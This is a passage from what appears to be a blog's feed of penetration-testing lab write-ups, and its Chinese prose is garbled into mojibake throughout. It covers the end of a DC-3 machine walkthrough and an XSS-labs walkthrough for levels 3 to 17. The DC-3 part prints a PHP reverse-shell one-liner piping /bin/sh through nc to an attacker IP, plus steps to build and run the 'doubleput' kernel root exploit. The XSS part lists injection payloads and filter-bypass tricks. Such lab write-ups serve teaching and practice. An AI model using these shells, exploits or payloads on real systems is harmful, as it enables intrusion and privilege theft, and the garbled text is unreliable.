id="ÂÜÖÊ†∏ÊèêÊùÉ"><a href="#ÂÜÖÊ†∏ÊèêÊùÉ" class="headerlink" title="ÂÜÖÊ†∏ÊèêÊùÉ"></a>ÂÜÖÊ†∏ÊèêÊùÉ</h3><p>ÂÖàÊü•ÁúãÁâàÊú¨‰ø°ÊÅØ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/issue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/78e3b21b476f4f90907e7c8a09de5f7b.png" alt="2"><br>Ëé∑ÂèñÁ≥ªÁªüÂÜÖÊ†∏ÂíåÊìç‰ΩúÁ≥ªÁªüÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/eb314af17f7848ff968aa5a820a7ab5e.png" alt="2"></p><blockquote><ul><li>LinuxÔºöÊìç‰ΩúÁ≥ªÁªüÁ±ªÂûãÔºåË°®Á§∫ËøôÊòØ‰∏Ä‰∏™LinuxÁ≥ªÁªü„ÄÇ</li><li>DC-3Ôºö‰∏ªÊú∫ÂêçÊàñËÆ°ÁÆóÊú∫ÂêçÁß∞„ÄÇ</li><li>4.4.0-21-genericÔºöÂÜÖÊ†∏ÁâàÊú¨Âè∑ÔºåËøôÈáåË°®Á§∫LinuxÂÜÖÊ†∏ÁâàÊú¨‰∏∫4.4.0-21-generic„ÄÇ</li><li>#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016ÔºöË°•‰∏ÅÁ∫ßÂà´ÂíåÊûÑÂª∫‰ø°ÊÅØÔºåÊòæÁ§∫‰∫ÜËØ•ÂÜÖÊ†∏ÊòØÂú®2016Âπ¥4Êúà18Êó•18Êó∂34ÂàÜ49ÁßíÔºàÂçèË∞É‰∏ñÁïåÊó∂ÔºâÊûÑÂª∫ÁöÑÔºåÂêåÊó∂ÈÄÇÁî®‰∫éUbuntuÁ≥ªÁªüÔºåÂπ∂‰∏îÂú®ÊûÑÂª∫Êó∂‰ΩøÁî®‰∫ÜÁ¨¨37‰∏™SMPÔºàÂØπÁß∞Â§öÂ§ÑÁêÜÔºâË°•‰∏Å„ÄÇ</li><li>i686 i686 i686ÔºöCPUÊû∂ÊûÑÔºåËøôÈáåË°®Á§∫ÊòØi686Êû∂ÊûÑÔºåÂç≥32‰Ωçx86Êû∂ÊûÑ„ÄÇ</li><li>GNU&#x2F;LinuxÔºöÊìç‰ΩúÁ≥ªÁªüÁ±ªÂûãÔºåË°®Á§∫ËøôÊòØ‰∏Ä‰∏™GNU&#x2F;LinuxÁ≥ªÁªüÔºåÂÖ∂‰∏≠GNUÊòØ‰∏Ä‰∏™Ëá™Áî±ËΩØ‰ª∂Êìç‰ΩúÁ≥ªÁªüÁöÑÁªÑÊàêÈÉ®ÂàÜ„ÄÇ</li></ul></blockquote><p>ÂêéÈù¢Â∞±ÂºÄÂßãÂèçÂºπshellËøõË°åÊèêÊùÉ</p><blockquote><p>kali:<code>nc -lnvp 6666</code><br>Èù∂Êú∫:ÂàõÂª∫‰∏Ä‰∏™PHPÊñá‰ª∂<br><code>&lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.206.134 6666 &gt;/tmp/f&#39;);?&gt;  </code></p></blockquote><p>wgetÂëΩ‰ª§‰∏ãËΩΩÊâæÂà∞ÁöÑzipÊñá‰ª∂ÂêéÊâßË°å‰ª•‰∏ãÂëΩ‰ª§</p><blockquote><p>unzip 39772.zip<br>tar -xvf exploit.tar<br>cd ebpf*<br>.&#x2F;compile.sh<br>.&#x2F;doubleput</p></blockquote><p>Â∞±ÂèØ‰ª•ÊàêÂäüÊèêÊùÉ‰∏∫root‰∫Ü„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Èù∂Âú∫ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSÊÄªÁªì</title>
      <link href="/2023/07/22/XSS%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/22/XSS%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><ul><li><h2 id="È¢òÁõÆ"><a href="#È¢òÁõÆ" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h2><h3 id="leval3"><a href="#leval3" class="headerlink" title="leval3"></a>leval3</h3><p>leval2Ê≤°Êúâ‰ΩøÁî®<strong>htmlspecialchars</strong>ÂáΩÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ËæìÂÖ•</p><blockquote><p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p></blockquote><p>‰ΩÜÊòØlevel4‰ΩøÁî®‰∫Ü<strong>htmlspecialchars</strong>ÂáΩÊï∞</p><blockquote><p>ÂÆö‰πâÂíåÁî®Ê≥ï<br>htmlspecialchars() ÂáΩÊï∞ÊääÈ¢ÑÂÆö‰πâÁöÑÂ≠óÁ¨¶ËΩ¨Êç¢‰∏∫ HTML ÂÆû‰Ωì„ÄÇ<br><img src="https://img-blog.csdnimg.cn/5e76f1783f0b4526a25482dc6c9d664a.png" alt="1"></p></blockquote><p>ÊâÄ‰ª•‰∏∫‰∫ÜÈÅøÂÖçËøô‰∫õÂá∫Áé∞ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®<strong>‰∫ã‰ª∂Ê≥®ÂÖ•</strong>ÔºåÈÄöËøáÈó≠ÂêàvalueÂÄºÔºåÁÑ∂ÂêéÂÜçÁî®onclickÂºπÁ™óÔºå‰πüÂç≥ÊòØ</p><blockquote><p><code>&#39;onclick=&#39;alert(1)</code></p></blockquote><p>ÂÜôÈáåÈù¢‰πãÂêéÂÜçÁÇπÂáª‰∏Ä‰∏ãËæìÂÖ•Ê°ÜÂ∞±‰ºöÂºπÁ™ó‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/0587c61ee365484b930177737361d966.png" alt="1"><br>ÂÖ∂ÂÆû‰∏äÈù¢ÊãºÊé•‰πãÂêéÂ∞±ÊòØ</p><blockquote><p><code>&lt;input name=keyword  value=&#39;&#39;onclick=&#39;alert(1)&#39;&gt;</code>ËøôÂ∞±Â•ΩÁêÜËß£Â§ö‰∫Ü</p></blockquote><p>ËøôÈáåÁúãÂà∞<code>&lt;input</code>Â∞±Â∫îËØ•ÊÉ≥Âà∞Ëøô‰∏™onclick</p><blockquote><p><code>&lt;input onclick=alert(11) &gt;</code>Ëøô‰∏™Â∞±ÊòØÂü∫Á°ÄÁöÑÂºπÊ°Ü</p></blockquote><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>‰∏äÈù¢ÁöÑ‰∫ã‰ª∂Ê≥®ÂÖ•ÁÖßÊ†∑‰πüÂèØ‰ª•„ÄÇ<br>ÊòØËøôÈáåÈù¢‰ªñÂπ∂Ê≤°Êúâ‰ΩøÁî®<strong>htmlspecialchars</strong>ÔºåËÄåÊòØÂ∞ÜËæìÂÖ•ÁöÑ<code>&lt;„ÄÅ&gt;</code>‰∏§‰∏™Â≠óÁ¨¶ÁªôÁΩÆÁ©∫‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/474c4cee9e9b47a3994c148fdbe5c6fe.png" alt="1"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="https://img-blog.csdnimg.cn/8a3a29c1c49e4dbe89bc5097276b2b3e.png" alt="1"><br>ËøôÈáå‰∏äÈù¢‰∏§‰∏™ÈÉΩ‰∏çËÉΩÁî®‰∫ÜÔºåÊàëËØï‰∫Ü‰∏Ä‰∏ã<code>&quot;&gt;&lt;input+onclick=alert(1)+&gt;//</code>ÁªìÊûúÁõ¥Êé•‰∏§‰∏™ËæìÂÖ•Ê°ÜÔºåÁÇπÂáªËæìÂÖ•Ê°Ü‰πüÊ≤°Áî®ÔºåÂõ†‰∏∫Êàë‰ª¨ÊâÄËæìÂÖ•ÁöÑÂ∞±ÊòØ&#x3D;&#x3D;$str&#x3D;&#x3D;ÁöÑÂÄºÔºåËøôÊ†∑‰πüÈÅøÂÖç‰∏ç‰∫ÜË¢´ÊõøÊç¢„ÄÇ<br><img src="https://img-blog.csdnimg.cn/982889f914994b1288a26c6cb160f3bb.png" alt="1"><br>ËøôÊó∂ÂÄôË¶ÅÊÉ≥Âà∞‰ΩøÁî®Âè¶‰∏ÄÁßçÂºπÁ™óÊñπÊ≥ï<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>ÔºåËøôÈáåËæìÂÖ•</p><blockquote><p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p></blockquote><p>ÁÑ∂ÂêéÊàëÊ†áËÆ∞ÁöÑÂú∞ÊñπÂ∞±ÊòØ‰∏Ä‰∏™ÈìæÊé•ÔºåÁÇπÂáª‰πãÂêéÂ∞±‰ºöÊâßË°åÂºπÁ™ó<br><img src="https://img-blog.csdnimg.cn/a8b6e357809a4cdba1c029dcc69f52d1.png" alt="2"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p><img src="https://img-blog.csdnimg.cn/a0faa242e1004d579d0f14dbd48dd765.png" alt="1"><br>ËøôÂÖ≥Ê≤°ÊúâËøáÊª§Â§ßÂ∞èÂÜôÔºåÂè™ÈúÄË¶ÅÂ∞ÜÈÇ£‰∏™ÂâçÈù¢ÁöÑËØ≠Âè•Êîπ‰∏∫Â§ßÂÜôÂ∞±Ë°å„ÄÇ</p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="https://img-blog.csdnimg.cn/9e4a5df41dc247d48a4edbd017e9ddea.png" alt="7"></p><p>Âíå‰∏äÈ¢òÁöÑÂå∫Âà´Â∞±ÊòØÂ¢ûÂä†‰∫ÜËΩ¨Êç¢Â§ßÂ∞èÂÜôÔºåËøòÊúâÂ∞Ü‰∏äÈù¢ÈÇ£‰∫õÂ≠óÁ¨¶ÁªôÁΩÆÁ©∫‰∫ÜÔºåÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•ËøõË°åÂèåÂÜôÁªïËøá„ÄÇ</p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="https://img-blog.csdnimg.cn/3adc192c19c94ffbb650b184fa0aab12.png" alt="8"></p><p>Âú®ËøôÈáåÊàë‰ª¨‰∏äÈù¢ÁöÑÊñπÊ≥ïÁî®‰∏ç‰∫Ü‰∫ÜÔºåÂ§ßÂ∞èÂÜô„ÄÅÂèåÂÜôÈÉΩ‰∏çË°å‰∫ÜÔºå‰∏ãÈù¢ÊòØÁî®htmlÂÆû‰ΩìÁºñÁ†ÅÁªïËøá<br><code>javascript:alert(1)</code>ÁöÑÂÆû‰ΩìÁºñÁ†Å‰∏∫<code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="https://img-blog.csdnimg.cn/e67c47475bd44f05996b85c6d4e9fc22.png" alt="9"><br>Ëøô‰∏ÄÂÖ≥Âú®‰∏ä‰∏ÄÂÖ≥ÁöÑÂü∫Á°Ä‰∏äÊ£ÄÊü•‰∫ÜÊï∞ÊçÆ‰∏≠ÊòØÂê¶‰ºöÊúâ**http:&#x2F;&#x2F;**Â≠óÊÆµÔºåËøôÈáåÂè™ÈúÄË¶ÅÊîπ‰∏∫<code>alert(&#39;http://&#39;)</code>Âç≥ÂèØ</p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p><img src="https://img-blog.csdnimg.cn/2a3dd15e795d4ba78017674caccc51d2.png" alt="1"><br>Âú®ËøôÈáåÈ¢òÁõÆÂ∞±ÊòØ‰∏ÄÂº†ÂõæÁâáÔºåÂú®ËøôÈáåÂîØ‰∏ÄËÉΩ‰∏ãÊâãÁöÑÂ∞±ÊòØÂèÇÊï∞„ÄÇ<br><img src="https://img-blog.csdnimg.cn/fe7ebe0e305f47e1a721ac46ab3e3ba9.png" alt="2"><br>ÈÇ£‰πàÁî±‰∏äÈù¢‰ª£Á†ÅÂèØ‰ª•ÁúãÂà∞ÊúâÁî®ÁöÑÂ∞±ÊòØ<strong>t_sort</strong>ÔºåËÄåËøôÈáå<code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code>Â∞ÜÂÖ∂ÈöêËóè‰∫Ü„ÄÇ</p><ul><li>Ëøô‰∏™<code>&lt;input&gt;</code>ÂÖÉÁ¥†ÁöÑ‰ΩúÁî®ÊòØÂú®‰∏Ä‰∏™Ë°®Âçï‰∏≠Ê∑ªÂä†‰∫Ü‰∏Ä‰∏™ÈöêËóèÁöÑËæìÂÖ•Â≠óÊÆµÔºåÂêçÁß∞‰∏∫‚Äùt_link‚ÄùÔºåÂàùÂßãÂÄº‰∏∫‚Äù‚Äò<code>$str33</code>‚Äò‚Äú„ÄÇÂΩìÁî®Êà∑Êèê‰∫§Ë°®ÂçïÊó∂ÔºåËøô‰∏™ÈöêËóèÂ≠óÊÆµÁöÑÂÄº‰ºöË¢´ÂåÖÂê´Âú®Ë°®ÂçïÊï∞ÊçÆ‰∏≠Ôºå‰ªéËÄåÂèØ‰ª•Âú®ÂêéÂè∞ËøõË°åÁõ∏Â∫îÁöÑÂ§ÑÁêÜ„ÄÇÈöêËóèÂ≠óÊÆµÂ∏∏Â∏∏Áî®‰∫éÂú®‰∏çÂΩ±ÂìçÁî®Êà∑‰ΩìÈ™åÁöÑÊÉÖÂÜµ‰∏ã‰º†ÈÄí‰∏Ä‰∫õÈáçË¶ÅÁöÑÊï∞ÊçÆ„ÄÇ</li></ul><p>Áî±‰∫éinputÊòØË¢´ÈöêËóèÁöÑÔºåÈÇ£‰πàÂ∞±ÈúÄË¶ÅÂÖ∂‰ªñÊñπÊ≥ïËß¶ÂèëÔºåËøôÈáåÈááÁî®htmlÁöÑaccesskeyÂ±ûÊÄß„ÄÇ</p><ul><li><p>accesskey ÊòØ HTML ‰∏≠ÁöÑ‰∏Ä‰∏™ÂÖ®Â±ÄÂ±ûÊÄßÔºàglobal attributeÔºâÔºåÂÆÉÁî®‰∫éÊåáÂÆö‰∏Ä‰∏™Âø´Êç∑ÈîÆÔºàaccess keyÔºâÊù•ÊøÄÊ¥ªÊàñÁÑ¶ÁÇπÔºàfocusÔºâÁâπÂÆöÁöÑÂÖÉÁ¥†„ÄÇ‰ΩøÁî®Âø´Êç∑ÈîÆÂèØ‰ª•ÈÄöËøáÈîÆÁõòÊìç‰ΩúÊù•Âø´ÈÄüËÆøÈóÆÈ°µÈù¢‰∏äÁöÑÊüê‰∫õÂÖÉÁ¥†ÔºåËÄåÊó†ÈúÄ‰ΩøÁî®Èº†Ê†á„ÄÇ<br>ÂΩìÁî®Êà∑Êåâ‰∏ãÊåáÂÆöÁöÑÂø´Êç∑ÈîÆÁªÑÂêàÊó∂Ôºå‰∏é accesskey Â±ûÊÄßÂÖ≥ËÅîÁöÑÂÖÉÁ¥†Â∞ÜËé∑ÂæóÁÑ¶ÁÇπÊàñÊøÄÊ¥ªÔºåÂÖ∑‰ΩìÁöÑË°å‰∏∫ÂèñÂÜ≥‰∫éÂÖÉÁ¥†ÁöÑÁ±ªÂûã„ÄÇÈÄöÂ∏∏ÔºåÊµèËßàÂô®ÂíåÊìç‰ΩúÁ≥ªÁªü‰ºöÊèê‰æõ‰∏çÂêåÁöÑÁªÑÂêàÈîÆÊù•Ëß¶ÂèëÂø´Êç∑ÈîÆÔºåÊØîÂ¶ÇÂú® Windows ‰∏ã‰ΩøÁî® Alt ÈîÆ + Âø´Êç∑ÈîÆÔºåÂú® macOS ‰∏ã‰ΩøÁî® Control ÈîÆ + Âø´Êç∑ÈîÆ„ÄÇ</p></li><li><p>accesskey Â±ûÊÄßÂèØ‰ª•Â∫îÁî®‰∫éÂá†‰πéÊâÄÊúâÁöÑHTMLÂÖÉÁ¥†ÔºåÂåÖÊã¨ÈìæÊé•„ÄÅÊåâÈíÆ„ÄÅËæìÂÖ•Â≠óÊÆµÁ≠âÁ≠â„ÄÇ</p></li></ul><p>‰ª•‰∏ãÊòØ‰∏Ä‰∏™‰ΩøÁî® accesskey Â±ûÊÄßÁöÑÁÆÄÂçïÁ§∫‰æãÔºö</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>accesskey Á§∫‰æã<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Êåâ‰∏ã Alt + G Âø´ÈÄüË∑≥ËΩ¨Âà∞ Google ÁΩëÁ´ôÔºö<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Êåâ‰∏ã Alt + S Âø´ÈÄüÊèê‰∫§Ë°®ÂçïÔºö<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰∏çÂêåÁöÑÊµèËßàÂô®ÂíåÊìç‰ΩúÁ≥ªÁªüÂèØËÉΩ‰ºöÂØπ accesskey ÁöÑÊîØÊåÅÊúâÊâÄ‰∏çÂêå„ÄÇ</p><p>ÊâÄ‰ª•ËøôÈáåÊàë‰ª¨ÈááÁî®<code>t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="https://img-blog.csdnimg.cn/3084e320d4da420281756af0ea730012.png" alt="11"></p><p>bpÊäìÂåÖÊ≥®ÂÖ•Âà∞referer‰∏≠</p><blockquote><p><code>REFERER: &quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p></blockquote><p><strong>level12</strong><br>Ê≥®ÂÖ•Âà∞UAÂ§¥‰∏≠„ÄÇ<br><strong>level13</strong><br>Ê≥®ÂÖ•cookie‰∏≠„ÄÇ</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p><img src="https://img-blog.csdnimg.cn/afbe4c0cc5e547b989e0ee4a26074f81.png" alt="1"><br>‰∫ÜËß£‰∏Ä‰∏ã**<a href="https://www.runoob.com/angularjs/ng-ng-include.html">ng-include</a>**Ôºö<br><img src="https://img-blog.csdnimg.cn/b5fabf566c78432b89a29ede76c26f8e.png" alt="2"><br>ÈÇ£ËøôÈáåÊàë‰ª¨Âà©Áî®level1ËøõË°åÂºπÁ™ó</p><blockquote><p><code>http://127.0.0.1:2000/xss-labs/level15.php?src=&#39;level1.php?name=&lt;img src=asd onerror=alert(1) &gt;&#39;</code></p></blockquote><p><strong>level16</strong><br>Á©∫Ê†ºË¢´ËøáÊª§‰ΩøÁî®Êç¢Ë°åÁ¨¶„ÄÇ</p><blockquote><p><code>&lt;img%0asrc=x%0aonerror=alert(123)&gt;</code></p></blockquote><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p><img src="https://img-blog.csdnimg.cn/7cc9b86cc21f419db6105b9bcea138f8.png" alt="123"></p><ul><li><p><code>&lt;embed&gt;</code>ÂÖÉÁ¥†Ôºö<code>&lt;embed&gt;</code>ÊòØHTML‰∏≠Áî®‰∫éÂµåÂÖ•Â§ñÈÉ®Â§öÂ™í‰ΩìËµÑÊ∫êÔºàÂ¶ÇFlashÂä®Áîª„ÄÅÈü≥È¢ë„ÄÅËßÜÈ¢ëÁ≠âÔºâÁöÑÊ†áÁ≠æ„ÄÇ</p></li><li><p><code>srcÂ±ûÊÄß</code>ÔºöËøôÊòØ<code>&lt;embed&gt;</code>ÂÖÉÁ¥†ÁöÑ‰∏Ä‰∏™Â±ûÊÄßÔºåÁî®‰∫éÊåáÂÆöË¶ÅÂµåÂÖ•ÁöÑÂ§ñÈÉ®ËµÑÊ∫êÁöÑURLÊàñÊñá‰ª∂Ë∑ØÂæÑ„ÄÇ</p></li><li><p><code>&quot;xsf01.swf?&quot;</code>ÔºöËøôÊòØ‰Ωú‰∏∫srcÂ±ûÊÄßÂÄºÁöÑÂÜÖÂÆπ„ÄÇÂÆÉÂåÖÂê´‰∫Ü‚ÄùÂÜÖÂÆπ‚ÄùËøô‰∏ÄÈÉ®ÂàÜ„ÄÇ</p></li></ul><p>Âà©Áî®html‰∫ã‰ª∂Â±ûÊÄß</p><blockquote><p><code>arg01=11&amp;arg02=1 onmousedown=alert(1)</code><br><code>arg01=11&amp;arg02=1 onmouseover=alert(1)</code></p></blockquote><p>Â∏∏ËßÅÁöÑonmousexxx‰∫ã‰ª∂Â±ûÊÄßÔºö<br><img src="https://img-blog.csdnimg.cn/2a085af5a34e4826b149e8f06e710200.png" alt="3"></p><h3 id="Áü•ËØÜÁÇπ"><a href="#Áü•ËØÜÁÇπ" class="headerlink" title="Áü•ËØÜÁÇπ"></a>Áü•ËØÜÁÇπ</h3><blockquote><p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p></blockquote><ul><li><code>&lt;img&gt;</code>: ËøôÊòØHTMLÊ†áÁ≠æÔºåÈÄöÂ∏∏Áî®‰∫éÂú®ÁΩëÈ°µ‰∏äÊòæÁ§∫ÂõæÂÉè„ÄÇÁÑ∂ËÄåÔºåÂÆÉ‰πüÂèØ‰ª•Ë¢´Âà©Áî®‰Ωú‰∏∫XSSÊîªÂáªËΩΩ‰Ωì„ÄÇ</li><li><code>src=1</code>: ËøôÈáåÁöÑsrcÊòØ<code>&lt;img&gt;</code>Ê†áÁ≠æÁöÑÂ±ûÊÄßÔºåÁî®‰∫éÊåáÂÆöÂõæÂÉèÁöÑURL„ÄÇÂú®ËøôÈáåÔºåÂ∞ÜÂõæÂÉèÁöÑURLËÆæÁΩÆ‰∏∫1ÔºåËøôÈÄöÂ∏∏ÊòØ‰∏∫‰∫ÜËÆ©Ëøô‰∏™Ê†áÁ≠æÂú®ÊòæÁ§∫ÂõæÂÉèÊó∂ËØ∑Ê±Ç‰∏Ä‰∏™Êó†ÊïàÁöÑURLÔºå‰ªéËÄåÂºïÂèëÈîôËØØ„ÄÇ</li><li><code>onerror=alert(1)</code>: ËøôÊòØXSSÊîªÂáªÁöÑÂÖ≥ÈîÆÈÉ®ÂàÜ„ÄÇ<code>onerror</code>ÊòØ‰∏Ä‰∏™‰∫ã‰ª∂Â±ûÊÄßÔºåÂÆÉÂÖÅËÆ∏Âú®ÂõæÂÉèÂä†ËΩΩÂ§±Ë¥•Êó∂Ëß¶ÂèëÁâπÂÆöÁöÑJavaScript‰ª£Á†Å„ÄÇÂú®ËøôÈáåÔºåÊÅ∂ÊÑèÁöÑJavaScript‰ª£Á†ÅÊòØ<code>alert(1)</code>ÔºåÂÆÉ‰ºöÂºπÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÊ°ÜÊòæÁ§∫Êï∞Â≠ó1„ÄÇ</li></ul><blockquote><p><code>&lt;input onclick=alert(1)&gt;</code></p></blockquote><ul><li><p><code>&lt;input&gt;</code>ÔºöËøôÊòØHTMLÊ†áÁ≠æÔºåÈÄöÂ∏∏Áî®‰∫éÂú®ÁΩëÈ°µ‰∏≠ÂàõÂª∫‰∫§‰∫íÂºèË°®ÂçïÂÖÉÁ¥†„ÄÇÂú®ËøôÈáåÔºåÂÆÉË¢´Áî®‰Ωú‰∏Ä‰∏™ËæìÂÖ•ÂÖÉÁ¥†„ÄÇ</p></li><li><p><code>onclick=alert(1)</code>ÔºöËøôÊòØ<input>Ê†áÁ≠æÁöÑ‰∫ã‰ª∂Â±ûÊÄß‰πã‰∏ÄÔºåÁî®‰∫éÂÆö‰πâÂΩìÁî®Êà∑Âú®Ê≠§ËæìÂÖ•ÂÖÉÁ¥†‰∏äÁÇπÂáªÊó∂Ë¶ÅÊâßË°åÁöÑJavaScript‰ª£Á†Å„ÄÇÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåJavaScript‰ª£Á†ÅÊòØ<code>alert(1)</code>ÔºåÂÆÉÂ∞ÜÂºπÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÊ°ÜÊòæÁ§∫Êï∞Â≠ó1„ÄÇ</p></li></ul><blockquote><p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p></blockquote><ul><li><p><code>&lt;a&gt;</code>ÔºöËøôÊòØHTML‰∏≠Áî®‰∫éÂàõÂª∫ÈìæÊé•ÁöÑÊ†áÁ≠æÔºåÈÄöÂ∏∏Áî®‰∫éÂØºËà™Âà∞ÂÖ∂‰ªñÈ°µÈù¢ÊàñËµÑÊ∫ê„ÄÇ</p></li><li><p><code>href=&quot;javascript:alert(1)&quot;</code>ÔºöËøôÊòØ<code>&lt;a&gt;</code>Ê†áÁ≠æÁöÑ<code>href</code>Â±ûÊÄßÔºåÁî®‰∫éÊåáÂÆöÈìæÊé•ÁöÑÁõÆÊ†áÂú∞ÂùÄ„ÄÇÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠Ôºå<code>href</code>Â±ûÊÄßÁöÑÂÄºÊòØ<code>javascript:alert(1)</code>„ÄÇËøôÊÑèÂë≥ÁùÄÂΩìÁî®Êà∑ÁÇπÂáªËøô‰∏™ÈìæÊé•Êó∂ÔºåÂ∞ÜÊâßË°åÂÖ∂‰∏≠ÁöÑJavaScript‰ª£Á†ÅÔºåËÄå‰∏çÊòØÂØºËà™Âà∞‰∏Ä‰∏™ÁΩëÂùÄ„ÄÇ</p></li><li><p><code>alert(1)</code>ÔºöËøôÊòØJavaScript‰ª£Á†ÅÁöÑÈÉ®ÂàÜÔºå<code>alert()</code>ÊòØ‰∏Ä‰∏™JavaScriptÂáΩÊï∞ÔºåÂÆÉÂ∞ÜÂºπÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÊ°ÜÂπ∂ÊòæÁ§∫Êï∞Â≠ó1„ÄÇ</p></li></ul><blockquote><p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; 